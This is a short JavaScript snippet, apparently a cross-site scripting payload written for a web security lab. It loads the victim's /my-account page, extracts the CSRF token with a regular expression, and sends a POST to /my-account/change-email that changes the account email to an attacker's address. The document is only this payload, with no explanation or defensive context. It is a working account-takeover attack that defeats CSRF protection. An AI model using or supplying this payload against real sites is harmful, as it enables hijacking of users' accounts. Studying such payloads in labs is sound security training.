var req = new XMLHttpRequest();
req.onreadystatechange = function(){
  var res = this.responseText.match(/name="csrf" value="\w+"/);
  token = res[0].split("value=\"")[1];
  token = token.slice(0, token.length-1)
  
  var changeEmailReq = new XMLHttpRequest();
  changeEmailReq.open('POST', '/my-account/change-email', true);
  changeEmailReq.send("email=attacker%40acc.com&csrf="+token)
}
req.open('GET', '/my-account', true);
req.send();